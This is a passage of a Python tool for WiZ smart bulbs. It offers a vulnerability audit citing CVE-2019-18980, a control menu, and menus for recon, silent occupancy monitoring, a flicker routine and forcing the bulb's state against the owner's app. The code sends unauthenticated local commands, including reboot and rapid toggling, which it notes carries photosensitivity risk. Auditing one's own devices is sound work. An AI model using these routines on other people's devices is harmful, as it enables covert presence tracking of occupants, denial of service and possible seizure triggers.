             f"homeId {s['homeId']} exposed — cloud account identifier", "NEW")

    # 4. Broadcast homeId — new finding
    vuln("broadcast_homeid_leak",
         "homeId leaked passively via UDP broadcast — zero interaction needed", "NEW")

    # 5. Occupancy profiling — new finding
    vuln("occupancy_profiling",
         "getPilot enables silent occupancy profiling — when home, asleep, away", "NEW")

    # 6. Flicker DoS
    vuln("flicker_dos",
         "No rate limiting on setPilot — flicker/DoS vector, photosensitivity risk", "NEW")

    # 7. Reboot
    rb = wiz_cmd(ip, "reboot")
    if rb and "error" not in rb:
        vuln("unauth_reboot", "Unauthenticated reboot")
    else:
        safe("Reboot requires auth")

    # 8. Firmware check
    fw = s.get("fwVersion", "0.0.0")
    try:
        fw_parts = list(map(int, fw.split(".")))
        if fw_parts < [1, 40, 0]:
            warn(f"Firmware {fw} < 1.40.0 — no local auth mechanism available")
            vulns.append("outdated_fw")
        else:
            safe(f"Firmware {fw} — local auth available (check if enabled)")
    except Exception:
        warn(f"Could not parse firmware version: {fw}")

    print(f"\n  {BOLD}Summary{RST}  {R}{len(vulns)} issue(s) found{RST}")
    for v in vulns:
        print(f"  {DIM}  · {v}{RST}")

    print(f"\n  {DIM}CVE-2019-18980: https://nvd.nist.gov/vuln/detail/CVE-2019-18980{RST}")
    print(f"  {DIM}Tip: Isolate IoT devices on a separate VLAN to limit exposure.{RST}")
    input(f"\n  {DIM}Press Enter to continue...{RST}")


# ── Control ───────────────────────────────────────────────────────────────────
def control_menu(ip):
    while True:
        os.system("clear")
        banner()

        r = wiz_cmd(ip, "getPilot")
        if r and "result" in r:
            p     = r["result"]
            state = f"{G}ON{RST}" if p.get("state") else f"{R}OFF{RST}"
            color = f"rgb({p['r']},{p['g']},{p['b']})" if "r" in p else f"temp {p.get('temp','?')}K"
            print(f"  {BOLD}{C}{ip}{RST}  ·  {state}  ·  {W}{p.get('dimming','?')}%{RST}  ·  {DIM}scene {p.get('sceneId','?')}  ·  {color}  ·  {p.get('rssi','?')} dBm{RST}\n")
        else:
            print(f"  {R}Bulb not responding{RST}\n")

        print(f"  {BOLD}Control{RST}")
        print(f"  {W}[1]{RST} Toggle ON/OFF")
        print(f"  {W}[2]{RST} Set brightness")
        print(f"  {W}[3]{RST} Set color (RGB)")
        print(f"  {W}[4]{RST} Set color temperature")
        print(f"  {W}[5]{RST} Set scene")
        print(f"  {W}[6]{RST} Sunrise     (scene 1)")
        print(f"  {W}[7]{RST} Party       (scene 14)")
        print(f"  {W}[8]{RST} Candlelight (scene 3)")
        print(f"  {W}[9]{RST} Cool white  (6500K)")
        print(f"  {W}[f]{RST} Flicker test   {DIM}(10x rapid toggle){RST}")
        print(f"  {W}[r]{RST} Red alert      {DIM}(pulse red 5x){RST}")
        print(f"  {W}[m]{RST} Morse message  {DIM}(flash any text in Morse code){RST}")
        print(f"  {W}[0]{RST} Back\n")

        choice = input(f"  {Y}>{RST} ").strip().lower()

        if choice == "1":
            cur = (r or {}).get("result", {}).get("state", True)
            _feedback(wiz_cmd(ip, "setPilot", {"state": not cur}))
        elif choice == "2":
            val = _get_int("Brightness (0-100): ", 0, 100)
            if val is not None:
                _feedback(wiz_cmd(ip, "setPilot", {"dimming": val}))
        elif choice == "3":
            rv = _get_int("Red   (0-255): ", 0, 255)
            gv = _get_int("Green (0-255): ", 0, 255)
            bv = _get_int("Blue  (0-255): ", 0, 255)
            if None not in (rv, gv, bv):
                _feedback(wiz_cmd(ip, "setPilot", {"r": rv, "g": gv, "b": bv, "dimming": 100}))
        elif choice == "4":
            t = _get_int("Color temp (2200-6500): ", 2200, 6500)
            if t is not None:
                _feedback(wiz_cmd(ip, "setPilot", {"temp": t, "dimming": 100}))
        elif choice == "5":
            sc = _get_int("Scene ID (1-32): ", 1, 32)
            if sc is not None:
                _feedback(wiz_cmd(ip, "setPilot", {"sceneId": sc}))
        elif choice == "6":
            _feedback(wiz_cmd(ip, "setPilot", {"sceneId": 1}))
        elif choice == "7":
            _feedback(wiz_cmd(ip, "setPilot", {"sceneId": 14}))
        elif choice == "8":
            _feedback(wiz_cmd(ip, "setPilot", {"sceneId": 3}))
        elif choice == "9":
            _feedback(wiz_cmd(ip, "setPilot", {"temp": 6500, "dimming": 100}))
        elif choice == "f":
            print(f"  {Y}Flickering...{RST}")
            for i in range(10):
                wiz_cmd(ip, "setPilot", {"state": i % 2 == 0}, timeout=1)
                time.sleep(0.25)
            wiz_cmd(ip, "setPilot", {"state": True})
            print(f"  {G}Done — restored ON{RST}")
            time.sleep(1)
        elif choice == "r":
            print(f"  {R}Red alert...{RST}")
            for _ in range(5):
                wiz_cmd(ip, "setPilot", {"r": 255, "g": 0, "b": 0, "dimming": 100}, timeout=1)
                time.sleep(0.4)
                wiz_cmd(ip, "setPilot", {"dimming": 5}, timeout=1)
                time.sleep(0.4)
            wiz_cmd(ip, "setPilot", {"state": True})
            print(f"  {G}Done{RST}")
            time.sleep(1)
        elif choice == "m":
            morse_message(ip)
        elif choice == "0":
            break


def _feedback(res):
    if res and res.get("result", {}).get("success"):
        print(f"  {G}Done{RST}")
    else:
        print(f"  {R}Failed or no response{RST}")
    time.sleep(0.6)


def _get_int(prompt, lo, hi):
    try:
        v = int(input(f"  {prompt}"))
        if lo <= v <= hi:
            return v
        print(f"  {R}Out of range ({lo}-{hi}){RST}")
    except (ValueError, KeyboardInterrupt):
        pass
    return None


# ── Info dump ─────────────────────────────────────────────────────────────────
def info_dump(ip):
    print(f"\n  {BOLD}{C}── Full Device Dump: {ip} ──{RST}\n")
    for method in ["getPilot", "getSystemConfig", "getUserConfig", "getModelConfig"]:
        r = wiz_cmd(ip, method)
        print(f"  {Y}{method}{RST}")
        if r:
            for k, v in (r.get("result") or r).items():
                print(f"    {DIM}{k:<22}{RST} {W}{v}{RST}")
        else:
            print(f"    {R}no response{RST}")
        print()
    input(f"  {DIM}Press Enter to continue...{RST}")


# ── Main menu ─────────────────────────────────────────────────────────────────
def main_menu(ip):
    while True:
        os.system("clear")
        banner()

        r = wiz_cmd(ip, "getPilot")
        if r and "result" in r:
            p     = r["result"]
            state = f"{G}● ON{RST}" if p.get("state") else f"{R}● OFF{RST}"
            print(f"  Bulb  {C}{ip}{RST}  {state}  {DIM}{p.get('rssi','?')} dBm{RST}\n")
        else:
            print(f"  Bulb  {C}{ip}{RST}  {R}● offline{RST}\n")

        print(f"  {W}[1]{RST} {BOLD}Control{RST}           — toggle, color, scenes, effects")
        print(f"  {W}[2]{RST} {BOLD}Audit{RST}             — vulnerability scan {DIM}(ref: CVE-2019-18980){RST}")
        print(f"  {W}[3]{RST} {BOLD}Intel / Recon{RST}     — all leaked info, broadcast capture, export")
        print(f"  {W}[4]{RST} {BOLD}Occupancy Monitor{RST} — silent presence detection log")
        print(f"  {W}[5]{RST} {BOLD}Device Info{RST}       — raw config dump")
        print(f"  {W}[6]{RST} {BOLD}Switch Bulb{RST}       — scan/enter different IP")
        print(f"  {W}[7]{RST} {BOLD}Force Lock{RST}        — {R}permanently{RST} force ON/OFF, override phone app")
        print(f"  {W}[8]{RST} {BOLD}Morse Message{RST}     — flash any text in Morse code via the bulb")
        print(f"  {W}[q]{RST} Quit\n")

        choice = input(f"  {Y}>{RST} ").strip().lower()

        if choice == "1":
            control_menu(ip)
        elif choice == "2":
            os.system("clear")
            banner()
            audit(ip)
        elif choice == "3":
            recon(ip)
        elif choice == "4":
            occupancy_monitor(ip)
        elif choice == "5":
            os.system("clear")
            banner()
            info_dump(ip)
        elif choice == "6":
            os.system("clear")
            banner()
            ip = select_bulb()
        elif choice == "7":
            force_lock(ip)
        elif choice == "8":
            morse_message(ip)
        elif choice == "q":
            print(f"\n  {DIM}bye{RST}\n")
            sys.exit(0)


# ── Entry point ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    try:
        banner()

        if len(sys.argv) > 1 and sys.argv[1] not in ("--scan", "-s"):
            ip = sys.argv[1]
            print(f"  {DIM}Using provided IP: {ip}{RST}\n")
            r = wiz_cmd(ip, "getPilot", timeout=3)
            if not r or "result" not in r:
                print(f"  {Y}No response from {ip} — continuing anyway{RST}\n")
        else:
            ip = select_bulb()

        main_menu(ip)

    except KeyboardInterrupt:
        print(f"\n\n  {DIM}Interrupted. Bye.{RST}\n")
        sys.exit(0)
